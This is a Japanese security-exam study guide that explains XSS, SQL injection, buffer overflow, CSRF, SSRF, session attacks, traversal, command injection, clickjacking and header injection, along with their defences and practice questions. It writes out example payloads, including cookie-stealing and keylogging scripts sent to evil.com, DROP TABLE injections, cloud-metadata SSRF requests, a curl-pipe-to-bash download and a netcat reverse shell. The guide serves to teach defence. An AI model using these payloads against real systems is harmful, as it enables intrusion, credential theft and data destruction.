02

XSS — クロスサイトスクリプティング

XSSは攻撃者が悪意あるスクリプトをWebページに埋め込み、ユーザのブラウザ上でスクリプトを実行させる攻撃。被害を受けるのはそのページを閲覧したユーザ。

反射型 XSS（Reflected）
URLパラメータにスクリプトを埋め込み、その場限りで実行させる。フィッシングリンクと組み合わせることが多い。
URLにスクリプト埋め込み DBに保存されない フィッシングメール経由

たとえ話

銀行サイトの「検索フォーム」に「お知らせ：あなたの口座が危険です！」と表示させる毒入り看板をURLに仕込み、そのURLのリンクをメールで送りつける。クリックした人だけが毒に当たる。

攻撃の仕組み

① 攻撃者がURLにスクリプトを埋め込んだリンクを作成
② メールやSNSでユーザに送付（フィッシング）
③ ユーザがクリック → サーバがパラメータをHTMLに出力
④ ブラウザがスクリプト実行 → Cookie窃取

具体的な攻撃例

// 攻撃URLの例 https://shop.example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script> // 脆弱なサーバ側コード（PHP） echo "検索結果: " . $_GET['q']; // エスケープなし！ // 生成されるHTML（危険） <p>検索結果: <script>...Cookie窃取...</script></p>

実際の被害例：銀行・ECサイトの検索機能、エラーメッセージを表示する箇所に多い

対策

HTMLエスケープ（出力時） CSP HttpOnly Cookie
// 安全なコード（PHP） echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); // < → &lt; > → &gt; " → &quot; // HTTPレスポンスヘッダ Content-Security-Policy: script-src 'self'
蓄積型 XSS（Stored） ← 最も危険
スクリプトをDBに保存。そのページを訪れた全ユーザに対して自動実行される。掲示板・SNS・コメント欄で発生。
DBに永続保存 全訪問者に影響 掲示板・コメント欄

たとえ話

銀行の公告掲示板に「スパイカメラが内蔵された偽のお知らせ」を貼り付ける。以降その掲示板を見たすべての人の情報が抜き取られ続ける。1回の攻撃で何千人もの被害が出る。

攻撃の仕組み

① 攻撃者がコメント欄にスクリプトを投稿
② サーバがエスケープなしでDBに保存
③ 誰かがそのページを開く
④ DBからスクリプト取得 → 全訪問者のブラウザで実行
⑤ Cookie・入力内容が攻撃者サーバへ送信

具体的な攻撃例

// 攻撃者のコメント投稿内容 素晴らしい記事です！<script> var i=new Image(); i.src='https://evil.com/steal?cookie='+document.cookie; </script> // キーロガー型（フォーム入力を全部送信） <script> document.addEventListener('keypress', function(e){ fetch('https://evil.com/log?k='+e.key); }); </script>

実際の被害例：海外SNSでのワームスクリプト拡散、ECサイト決済フォームへのキーロガー埋め込み（MageCart攻撃）

対策

保存時サニタイズ 出力時エスケープ CSP HttpOnly Cookie
// DOMPurify等のサニタイズライブラリ const clean = DOMPurify.sanitize(userInput); // CSPヘッダ（インラインスクリプト禁止） Content-Security-Policy: script-src 'self'; default-src 'self' // HttpOnly Cookie Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
03

SQLインジェクション

入力値にSQL文の断片を混入させ、DBへの不正なSQL命令を実行させる攻撃。情報漏洩・認証バイパス・データ削除など被害が甚大。

たとえ話

図書館員（Webアプリ）が「どんな本を探しますか？」と受付で聞き、そのまま司書（DBサーバ）に紙を渡す。通常「吾輩は猫である」と書く紙に、攻撃者は「何でも; その後、全蔵書情報を教えて」と書く。司書は指示通り実行してしまう。

認証バイパスの仕組み

ログインSQL：WHERE id='入力' AND pass='入力'
攻撃入力：admin'--
結果SQL：WHERE id='admin'--' AND pass='...'
→ --以降はコメントとなりパスワード確認が無効化！

攻撃の種類と具体例

認証バイパス
-- 通常のログインSQL SELECT * FROM users WHERE id='yamada' AND pass='pass123' -- 攻撃：パスワード欄に ' OR '1'='1 を入力 SELECT * FROM users WHERE id='yamada' AND pass='' OR '1'='1' -- 常に真になるため全ユーザにマッチ → 認証突破 -- 攻撃：IDに admin'-- を入力 SELECT * FROM users WHERE id='admin'--' AND pass='...' -- -- 以降がコメント化 → パスワード確認をスキップ
UNION SELECT（情報窃取）
-- 通常のURLパラメータ ?category=1 -- 攻撃：UNION SELECTで別テーブルを参照 ?category=1 UNION SELECT username,password,NULL FROM users-- -- 生成されるSQL SELECT name,price,desc FROM products WHERE cat=1 UNION SELECT username,password,NULL FROM users-- -- 商品一覧の中にユーザ名・パスワードが混入して表示！
ブラインドSQLi（エラー非表示時）
-- エラーが画面に出なくても..．真偽で差異を確認 ?id=1 AND 1=1 -- 正常表示（真） ?id=1 AND 1=2 -- 空ページ（偽） -- パスワードの1文字目を推測 ?id=1 AND SUBSTRING(password,1,1)='a' -- 表示差分から1文字ずつ割り出す
データ破壊
-- 注文IDに注入してDB破壊 ?order_id=1; DROP TABLE orders; DROP TABLE users;-- -- 全ユーザのパスワードをリセット ?id=1; UPDATE users SET password='hacked' WHERE 1=1;--

対策

プリペアド
プリペアドステートメント（根本対策）：SQL文の構造をデータと完全に分離。?プレースホルダに値をバインドするためSQLとして解釈されない。
// Java（JDBC） PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id=?"); stmt.setString(1, userId); // Python（SQLAlchemy） db.execute("SELECT * FROM users WHERE id=:id", {"id": user_id}) // PHP（PDO） $stmt = $pdo->prepare("SELECT * FROM users WHERE id=?"); $stmt->execute([$userId]);
最小権限
DBアカウントの最小権限化：Webアプリ用アカウントにはSELECTのみ付与。DROPやUPDATEの権限を与えない。攻撃が成功しても被害を最小化できる。
04

バッファオーバーフロー

バッファオーバーフロー（BOF）はプログラムが確保したメモリ領域を超えたデータを書き込み、隣接するリターンアドレスを上書きして任意コードを実行させる攻撃。C/C++で多発。

たとえ話

机の上に「100mlのコップ（バッファ）」が置かれ、隣に「次の仕事の指示書（リターンアドレス）」がある。通常は100ml以下を注ぐが、攻撃者が200ml注ぐと溢れた水がメモを濡らし内容を書き換える。書き換えられた指示書に「金庫を全開にして逃げろ」と書けば任意命令が実行される。

スタック上の変化

スタック（高アドレス側から）：
[リターンアドレス] ← ここを上書き！
[フレームポインタEBP]
[バッファ 16bytes] AAAA...AAA

16bytes確保のバッファに32bytes書き込むと、リターンアドレスがシェルコードのアドレスに書き換えられ、関数リターン時に任意コードが実行される。

スタックの変化（正常 vs 攻撃時）

正常（バッファ内に収まる）
高アドレス
リターンアドレス: 0x004010f0
正常な呼び出し元
EBP（フレームポインタ）
バッファ [16bytes]
"Hello" = 5bytes のみ使用
低アドレス
リターンアドレス無事 → 正常に関数から戻る
攻撃時（32bytesを書き込み）
高アドレス
リターンアドレス: 0xdeadbeef
← シェルコードアドレスに書換！
EBP → 上書き済み
AAAA...（16bytes）+ シェルコード
バッファ超えて上書き中！
低アドレス
関数リターン時にシェルコード実行 → サーバ制御奪取

対策（4本柱）

ASLR（アドレスランダム化）
スタック・ヒープ・ライブラリのアドレスを毎回ランダム化。攻撃者はシェルコードの正確なアドレスを予測できなくなる。OSレベルの保護。
DEP/NX（実行不可ビット）
スタック・ヒープをデータ領域として実行不可に設定。シェルコードを書き込んでも実行できなくなる。ハードウェア（CPU）とOS双方で対応。
スタックカナリア（番犬値）
バッファとリターンアドレスの間にランダムなカナリア値を配置。関数リターン前に値が書き換えられていないか確認。コンパイラオプション（-fstack-protector）で自動挿入。
安全なAPIの使用
危険：gets()・strcpy()・sprintf()
安全：fgets(n)・strncpy(n)・snprintf(n)
長さ引数nで書き込みを制限。
05

CSRF — クロスサイトリクエストフォージェリ

ログイン中のユーザを騙して意図しないリクエストを正規サービスに送信させる攻撃。ユーザが認証済みのためサーバは正規リクエストと判断してしまう。

たとえ話

ネットバンクにログイン中の人が別サイトを閲覧中。その別サイトに「今すぐチェック」という画像があり、そのURL（src）が銀行の送金APIになっている。ページを開いただけでブラウザが自動的にCookieつきで送金リクエストを送信してしまう。

攻撃の仕組み

① ユーザが正規サービス（銀行）にログイン
② 攻撃者の罠サイトにアクセス
③ 罠サイトのHTML（imgタグ等）が自動的にリクエストを送信
④ ブラウザがCookieを自動添付
⑤ 銀行サーバは正規ユーザのリクエストと判断 → 処理実行

罠サイトのHTML例（攻撃の仕掛け方）

GETリクエスト型（imgタグ）
<!-- 罠サイトのHTML --> <img src="https://bank.jp/transfer?to=attacker&amount=100000" width="1" height="1"> <!-- ページを開くだけで自動実行 --> <!-- 1x1ピクセルで見えない -->
POSTリクエスト型（自動送信フォーム）
<form action="https://bank.jp/transfer" method="POST" id="f"> <input type="hidden" name="to" value="attacker"> <input type="hidden" name="amount" value="100000"> </form> <script>document.getElementById('f').submit();</script> <!-- ページロードと同時に送信 -->

CSRF vs XSS の決定的な違い：XSSはブラウザでスクリプトを実行させる（攻撃者→ユーザのブラウザ）。CSRFはユーザのブラウザにリクエストを送信させる（ユーザのブラウザ→正規サーバ）。CSRFはスクリプト実行不要なため、imgタグ1行で発動できる。
CSRF vs SSRF：CSRFはクライアント（ブラウザ）側から、SSRFはサーバ側からリクエストを発行させる。

対策

CSRFトークン
CSRFトークン（最重要）：セッションごとにランダムなトークンをフォームに埋め込み、サーバがリクエスト時に検証。攻撃者はトークン値を知ることができないため偽リクエストを作れない。
<!-- フォームにトークンを埋め込む --> <input type="hidden" name="csrf_token" value="a8f3c72b..."> // サーバ側での検証 if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) { die('CSRF攻撃を検知'); }
SameSite
Cookie の SameSite 属性：SameSite=Strictでクロスサイトリクエスト時のCookie送信をブロック。SameSite=Lax（多くのブラウザのデフォルト）はGETのトップレベルナビゲーションのみ許可。

SSRF — サーバサイドリクエストフォージェリ

攻撃者がWebアプリにサーバ側から内部ネットワークへのリクエストを発行させる攻撃。FWで守られた内部システムへのアクセスが可能になる。クラウド環境では特に深刻。

たとえ話

銀行の入口には警備員（FW）がいて外部からの侵入を防ぐが、受付係（Webアプリ）は社内を自由に動ける。攻撃者が「この手紙を金庫室（内部サーバ）に届けて返事を持ってきて」と受付係に頼む。受付係が業務として金庫室に行き内容を持ち帰るため、外部からは入れない場所の情報が取得される。

具体的な攻撃例

// 画像URLを受け取るAPIへの攻撃 // 通常の使い方 POST /fetch-image {"url": "https://example.com/image.jpg"} // SSRF攻撃：内部サービスへアクセス {"url": "http://localhost/admin"} {"url": "http://192.168.1.100/api/secret"} // AWSクラウドメタデータ窃取（最重大） {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-role"} // → IAMクレデンシャル（Access Key + Secret Key）が取得される！ // ファイル読み取り（fileスキーム） {"url": "file:///etc/passwd"} {"url": "file:///var/www/html/.env"}

対策

ホワイトリスト
アクセス先のホワイトリスト化：Webアプリからのリクエスト先を許可リストで厳格に制限。内部IPアドレス（169.254.x.x、10.x.x.x、172.16-31.x.x、192.168.x.x）へのアクセスをブロック。file://・gopher://等の危険スキームも禁止。
IMDSv2
クラウドメタデータ保護（AWS等）：IMDSv2（Instance Metadata Service v2）はPUTリクエストによるトークン取得が必要なため、SSRF経由での直接アクセスを防ぐ。クラウド環境での必須設定。
07

セッションハイジャック・セッションフィクセーション

セッションIDを標的にした2つの攻撃。ハイジャックはセッションIDを盗む、フィクセーションはセッションIDを事前に固定する。

セッションハイジャック
認証後 → セッションIDを盗む

たとえ話：ホテルにチェックイン後に部屋カードをスリに盗まれる。盗んだカードを使えば部屋（アカウント）に入り放題。

// Cookie窃取（XSS経由） document.cookie → "session=abc123def" // 攻撃者がこのsession値をブラウザのCookieにセット // → 被害者として認証された状態になる // パケット盗聴（非HTTPS） // Cookie: session=abc123def がネットワーク上を平文で流れる // Wiresharkなどで容易に取得可能
HttpOnly Cookie（JS読み取り禁止） HTTPS（通信暗号化） Secure Cookie属性
セッションフィクセーション
認証前 → セッションIDを固定させる

たとえ話：攻撃者が偽のホテルカード（既知のセッションID）を先にゲストに渡す。ゲストがそのカードでチェックインすると、攻撃者も同じカードで入室できるようになる。

// ①攻撃者がセッションIDを取得 GET /login → Set-Cookie: session=FIXED123 // ②ユーザにセッションIDを含むURLを踏ませる https://bank.jp/login?session=FIXED123 // ③ユーザがFIXED123のままログイン // ④攻撃者がFIXED123を使うと認証済みとして扱われる
ログイン時にセッションID再生成（根本対策）
08

ディレクトリトラバーサル

../（親ディレクトリ参照）を使いWebルート外のファイルに不正アクセスする攻撃。/etc/passwdや設定ファイルの漏洩が代表的な被害。

たとえ話

ショッピングモールの1階（/images/）は公開ゾーン。「../ = 1フロア上へ」という特殊な階段を使い、「../../事務室/鍵リスト（/etc/passwd）」まで遡ることができる。セキュリティの想定は「1階だけ」だったため、事務室のドアに鍵がかかっていない。

攻撃例（様々なエンコード）

// 基本形 GET /viewfile?name=../../../../etc/passwd // URLエンコードを使ったフィルタ迂回 GET /viewfile?name=..%2F..%2F..%2Fetc%2Fpasswd // %2F = / %2E = . // ダブルエンコード（フィルタ迂回） GET /viewfile?name=..%252F..%252Fetc%252Fpasswd // %25 = % → %2F = /（二重デコード） // Windowsのバックスラッシュ（IIS等） GET /viewfile?name=..\..\..\..\Windows\win.ini // サーバ内部での解釈 // /var/www/html/images/../../../../etc/passwd // = /etc/passwd → root権限情報が漏洩！

対策

パス正規化
パスの正規化と検証：realpath()等でパスを正規化してから、許可されたベースディレクトリ内に収まるかを確認する。
// PHP での安全な実装 $base = '/var/www/html/images/'; $realPath = realpath($base . $userInput); if (strpos($realPath, $base) !== 0) { die('不正なパス'); // ベースディレクトリ外は拒否 }
間接参照
ファイル名の間接参照：ユーザにファイル名を直接指定させず、数字IDとファイルのマッピングをサーバ側で管理する（?id=3→image3.jpg）。そもそもパス操作が不要な設計にする。
09

OSコマンドインジェクション

シェルの特殊文字を入力に混入し、Webサーバの権限で任意のOSコマンドを実行させる攻撃。SQLiよりも直接的でサーバへの影響が甚大。

たとえ話

工場の管理端末（Webアプリ）が「どの在庫を確認しますか？」と聞く。通常「りんご」と答えると「在庫確認 りんご」という命令が実行される。攻撃者が「りんご; 全設備を停止せよ」と入力すると「在庫確認 りんご」と「全設備停止」の両方が実行される。

シェル特殊文字と攻撃例

// 脆弱なPHPコード $host = $_GET['host']; system("ping -c 1 " . $host); // ① セミコロン：前後どちらも実行 ?host=google.com; cat /etc/passwd // → ping -c 1 google.com; cat /etc/passwd // ② パイプ：前の出力を後ろへ ?host=google.com | id // → uid=33(www-data) gid=33(www-data) // ③ バッククォート：コマンド置換 ?host=`whoami` // ④ &&：前が成功したら後を実行 ?host=localhost && curl https://evil.com/shell.sh | bash // ⑤ $()：コマンド置換（bash） ?host=$(nc -e /bin/bash evil.com 4444) # リバースシェル

SQLiとOSコマンドiの違い

SQLインジェクション
注入先：SQL構文（データベース）
影響範囲：DBの読み書き・削除
被害例：個人情報漏洩、認証バイパス
悪用するもの：' -- UNION SELECT
OSコマンドインジェクション ← より危険
注入先：シェル（OS）
影響範囲：サーバ全体を制御可能
被害例：バックドア、全ファイル削除、他サーバへの攻撃
悪用するもの：; | && `$() ||

対策

根本対策
OSコマンドを使わない設計（根本対策）：pingの代わりにfsockopen()（PHP）、socketモジュール（Python）等のライブラリAPIを使う。シェルを経由しないため根本的に安全。
引数分離
シェルを経由しない実行方式：
// 危険：シェルを経由 system("ping -c 1 " . $host); // ; で追加コマンド可能 // 安全：引数を配列で渡す（PHP） $proc = proc_open(['ping', '-c', '1', $host], ...); // シェルを介さないため ; | && が無効化 // Python でも同様 subprocess.run(["ping", "-c", "1", host], shell=False)
10

クリックジャッキング

正規サイトを透明なiframeで重ねて表示し、ユーザが意図しないクリックを正規サイトのボタンに対して行わせる視覚的詐欺攻撃。

たとえ話

喫茶店のメニュー（罠サイト）に「今日のおすすめ」と書かれたボタンがある。実はその上に透明なアクリル板（invisible iframe）が置かれていて、その位置には銀行の「全額送金確認」ボタンが重なっている。「おすすめ」をタップしたつもりが実際には送金を確認してしまっている。

攻撃の仕組み（HTML）

<!-- 罠サイト --> <style> .decoy-button { position: absolute; top: 200px; left: 100px; z-index: 1; } .victim-iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; /* 完全透明！ */ z-index: 2; /* 前面に配置 */ } </style> <!-- ユーザに見えるコンテンツ --> <button class="decoy-button">今日のおすすめをチェック！</button> <!-- 透明に重ねた正規サイト --> <iframe class="victim-iframe" src="https://bank.jp/transfer-confirm"></iframe>

対策

X-Frame-Options
X-Frame-Options ヘッダ（最重要）：自サイトがiframeに読み込まれることを禁止する。設定するのは守られる側（正規サイト）のサーバ。
# DENY: すべてのiframe埋め込みを拒否 X-Frame-Options: DENY # SAMEORIGIN: 同一オリジンのみ許可 X-Frame-Options: SAMEORIGIN # 新しい方式（CSP） Content-Security-Policy: frame-ancestors 'none'
11

HTTPヘッダインジェクション

HTTPレスポンスヘッダにCRLF（\r\n）を注入し、任意のヘッダを追加・レスポンスを分割する攻撃。HTTPレスポンス分割攻撃とも呼ばれる。

たとえ話

郵便局（サーバ）が配達票（HTTPレスポンスヘッダ）を作成するとき、受取人名（ユーザ入力）をそのまま書き込む。攻撃者が「田中様←改行→差出人変更：悪意サーバ←改行←改行→偽コンテンツ」と入力すると、改行以降が新しいヘッダやボディとして解釈されてしまう。

具体的な攻撃例

// 脆弱なリダイレクト処理 // ?lang=ja → Location: /page?lang=ja // 攻撃入力（CRLFを含む） ?lang=ja%0d%0aSet-Cookie%3A+session%3Dhacked // %0d%0a = CR LF（改行） %3A = : %3D = = // 生成されるHTTPレスポンス（危険） HTTP/1.1 302 Found Location: /page?lang=ja Set-Cookie: session=hacked ← 注入されたヘッダ // レスポンス分割（より深刻） ?lang=ja%0d%0a%0d%0a<html>偽ページ</html> // 空行（CRLF×2）の後はボディとして解釈 → 偽ページ配信

対策

CRLF除去
改行コード（CR・LF）の除去：ユーザ入力からヘッダに使う値のCR（\r / %0d）とLF（\n / %0a）を除去。フレームワークの安全なリダイレクトメソッドを使うことで多くの場合自動的に対策される。
12

メールヘッダインジェクション

メール送信フォームの入力値にCRLFを注入し、BCC等のヘッダを追加してスパムメールの踏み台にする攻撃。正規ドメインからのスパムとなりSPFを通過しやすい。

攻撃例

// お問い合わせフォームの「件名」に注入 製品について\r\nBcc: target1@evil.com,target2@evil.com\r\n // 生成されるメール From: support@legitimate-company.com To: info@legitimate-company.com Subject: 製品について Bcc: target1@evil.com,target2@evil.com ← 注入 // 「From」を偽装してなりすまし送信 製品について\r\nFrom: president@bank.jp\r\n // → 銀行社長からの偽メールとして送信

HTTPヘッダiとの比較 / 対策

共通点：どちらもCRLFの注入が手法
違い：HTTPヘッダiはWebサーバのレスポンスヘッダを改ざん、メールヘッダiはメール送信時のヘッダを改ざん
CRLFの除去（共通対策） To/Fromを固定値にする
// PHP（mb_send_mail使用時） $subject = preg_replace('/\r|\n/', '', $_POST['subject']); // CRとLFを除去してからヘッダに使用 // PHPMailer等のライブラリを使うと自動対策 $mail = new PHPMailer(true);

比較・総合整理

全攻撃 — 多軸ビジュアル比較

各攻撃の危険度・攻撃難易度・発見難易度（クリックで詳細表示）
※棒グラフをクリックすると攻撃の詳細が表示されます

よく混同される攻撃ペアの決定的な違い

XSS vs CSRF — 最頻出混同
XSS
攻撃者がスクリプトを植え付け → ブラウザで実行
被害：Cookie窃取、フィッシング
スクリプト実行が必要
CSRF
ブラウザから正規サーバへ偽リクエスト
被害：不正送金、設定変更
スクリプト不要（imgタグ可）
覚え方：XSS=「ブラウザで実行」, CSRF=「サーバへ送信」
CSRF vs SSRF — C/Sの違い
CSRF（Cross-Site）
クライアント（ブラウザ）が偽リクエストを送信
被害：ユーザの操作の偽装
SSRF（Server-Side）
サーバが内部ネットワークへリクエスト
被害：内部サービスへの不正アクセス
覚え方：C=Client（クライアント）, S=Server（サーバ）側から
セッションハイジャック vs フィクセーション
ハイジャック
認証後にセッションIDを盗む
「カードを盗まれる」
フィクセーション
認証前にIDを固定させる
「偽カードを先渡し」
共通対策：ログイン時のセッションID再生成が両方に効く
SQLi vs OSコマンドi — 両方「インジェクション」
SQLインジェクション
注入先：SQL（DB）
範囲：DBの読み書き
' OR UNION DROP
OSコマンドi（より危険）
注入先：シェル（OS）
範囲：サーバ全体制御
; | && `$()
どちらも：構造とデータを分離するか、そもそも使わない設計が根本対策

試験対策 攻撃整理の核心

インジェクション系：SQL→DBへ注入、OSコマンド→シェルへ注入、HTTPヘッダ/メールヘッダ→CRLF改行で分割、XSS→HTMLへスクリプト注入。それぞれ注入先の構文が異なるため対策も異なる。

リクエスト偽造系：CSRF=クライアント側から正規サーバへ偽リクエスト、SSRF=サーバ側から内部ネットワークへ偽リクエスト。「誰が」「どこへ」送るかで区別。

セッション攻撃：ハイジャック=認証後に盗む、フィクセーション=認証前に固定。共通対策は「ログイン時のセッションID再生成」。

BOF対策の4本柱：ASLR（ランダム化）・DEP/NX（実行不可）・スタックカナリア（番犬値）・安全なAPI（strncpy等）。

過去問スタイル 練習問題

Q1SQLインジェクション対策として最も根本的なものはどれか。
正解：イ
プリペアドステートメントはSQL文の構造とデータを完全に分離するため、入力にSQL文を混入されても命令として解釈されない根本的な対策。ア=XSS対策（HTMLエスケープが正確）、ウ=XSS経由のCookie窃取対策、エ=クリックジャッキング対策。
Q2CSRFとSSRFを比較した説明として最も適切なものはどれか。
正解：ウ
CSRF（Cross-Site）=クライアント（ユーザのブラウザ）が偽リクエストを正規サーバへ送信。SSRF（Server-Side）=Webアプリ（サーバ）が踏み台となり内部ネットワークへリクエストを発行。C=Client側から、S=Server側から、と覚える。
Q3セッションフィクセーション攻撃への最も重要な対策はどれか。
正解：エ
セッションフィクセーションは「ログイン前に攻撃者が固定したセッションIDをユーザに使わせる」攻撃。認証成功時に新しいセッションIDを発行し直すことで、事前に固定されたIDを無効化できる根本対策。ア・イはセッションハイジャック対策（盗まれにくくする）、ウはCSRF対策。
Q4バッファオーバーフロー対策として、バッファとリターンアドレスの間にランダムな値を配置し、関数リターン前にその値が書き換えられていないかを検証する手法はどれか。
正解：イ
スタックカナリア（Stack Canary）はバッファとリターンアドレスの間にランダムなカナリア値を「番犬」として配置し、関数リターン時に値が書き換えられていないかを検証するBOF対策。
ア=データ領域の実行不可設定（シェルコードの実行を防ぐ）、ウ=メモリ配置のランダム化（アドレス予測を困難に）、エ=CSRF攻撃への対策（無関係）。
Q5OSコマンドインジェクション対策として最も根本的なものはどれか。
正解：ウ
OSコマンドインジェクションの根本対策はOSコマンドをそもそも使わない設計。必要な場合はsubprocess.run(["ping", "-c", "1", host], shell=False)のように引数を配列で渡すことでシェルを介さず、;や|等の特殊文字が区切り記号として解釈されなくなる。ア=XSS対策、イ=ヘッダインジェクション対策、エ=SQLインジェクション対策。
Q6クリックジャッキング攻撃を防ぐためにWebサーバ（守られる側）が設定すべきHTTPレスポンスヘッダはどれか。
正解：イ
X-Frame-Optionsは自サイトがiframe等のフレームに読み込まれることを制御するHTTPレスポンスヘッダ。X-Frame-Options: DENYで全iframeを拒否、SAMEORIGINで同一オリジンのみ許可。クリックジャッキングはiframeで正規サイトを重ねる攻撃なので、これを防ぐことで根本対策となる。
Q7ディレクトリトラバーサル攻撃において「../」が意味するものとして正しいものはどれか。
正解：イ
../はOSのファイルシステムにおいて「1階層上（親ディレクトリ）」を指す。ディレクトリトラバーサルでは../../../../etc/passwdのように繰り返し使うことでWebルート（/var/www/html）の外にある機密ファイルにアクセスする。URLエンコード（%2F=/、%2E=.）を使ったフィルタ迂回も要注意。

重要用語まとめ

XSS（Reflected）反射型XSS。URLパラメータにスクリプトを埋め込みその場限りで実行させる。フィッシングメールと組み合わせることが多い。
XSS（Stored）蓄積型XSS。スクリプトをDBに保存しページの全訪問者に実行させる。最も危険なXSS。
XSS（DOM-based）DOMベース型XSS。サーバを経由せずクライアント側JSがDOMを操作する際に発生。サーバログに痕跡が残りにくい。
HTMLエスケープXSS対策。<を&lt;、>を&gt;等に変換してHTMLタグとして解釈させない。出力時の適用が重要。
Content Security Policy（CSP）HTTPヘッダで許可するスクリプト発生源を制限するXSS・クリックジャッキング対策。script-src 'self'等で外部スクリプトを禁止。
SQLインジェクション入力値にSQL文を混入してDBを不正操作する攻撃。情報漏洩・認証バイパス・データ削除が主な被害。
プリペアドステートメントSQL文の構造とデータを分離して実行する仕組み。SQLiの根本対策。バインドパラメータとも呼ぶ。
バッファオーバーフロー確保したバッファを超えてデータを書き込みリターンアドレスを上書きし任意コードを実行させる攻撃。C/C++で多発。
ASLRAddress Space Layout Randomization。メモリ配置をランダム化しBOF攻撃者のアドレス予測を困難にするOS保護機構。
DEP/NXData Execution Prevention / No-Execute。データ領域を実行不可にしシェルコードの実行を防ぐBOF対策。
スタックカナリアバッファとリターンアドレスの間に番犬値を配置し書き換えを検出するBOF対策。コンパイラが自動挿入。
CSRFCross-Site Request Forgery。ログイン中ユーザのブラウザ（クライアント側）から正規サービスへ意図しないリクエストを送信させる攻撃。
CSRFトークンフォームに埋め込むランダムなトークン。サーバがリクエスト時に検証することでCSRFを防ぐ根本対策。
SameSite属性CookieのクロスサイトリクエストでのCookie送信を制御する属性。Strict/Lax/NoneでCSRF対策に使用。
SSRFServer-Side Request Forgery。WebアプリをプロキシにしてサーバからFW内の内部サービスへリクエストを発行させる攻撃。クラウドメタデータ窃取が特に危険。
セッションハイジャック認証後のセッションIDを盗んでアカウントを乗っ取る攻撃。HttpOnly・Secure Cookie・HTTPSが対策。
セッションフィクセーションログイン前にセッションIDを固定させ認証後にそのIDを使って乗っ取る攻撃。ログイン時のセッションID再生成が根本対策。
HttpOnly属性JavaScriptからのCookie読み取りを禁止するCookie属性。XSS経由のCookie窃取を防ぐ。
ディレクトリトラバーサル「../」でWebルート外のファイルにアクセスする攻撃。realpath()による正規化・間接参照が対策。
OSコマンドインジェクションシェル特殊文字（;|&&`等）でOSコマンドを追加注入しサーバを制御する攻撃。OSコマンド不使用・引数分離が対策。
クリックジャッキング透明iframeで正規サイトを覆いユーザのクリックを横取りする攻撃。X-Frame-Options・CSP frame-ancestorsが対策。
X-Frame-OptionsHTTPレスポンスヘッダ。DENY/SAMEORIGINでiframeへの埋め込みを制御するクリックジャッキング対策。
HTTPヘッダインジェクションCRLF（\r\n）をHTTPレスポンスヘッダに注入し任意のヘッダ追加・レスポンス分割を行う攻撃。
CRLFCarriage Return（\r）+ Line Feed（\n）。HTTPヘッダとメールヘッダの区切り。%0d%0aとしてURLエンコードされインジェクション攻撃に悪用される。
メールヘッダインジェクションメール送信フォームにCRLFを注入しBcc等のヘッダを追加しスパム踏み台にする攻撃。CRLF除去・固定値使用が対策。
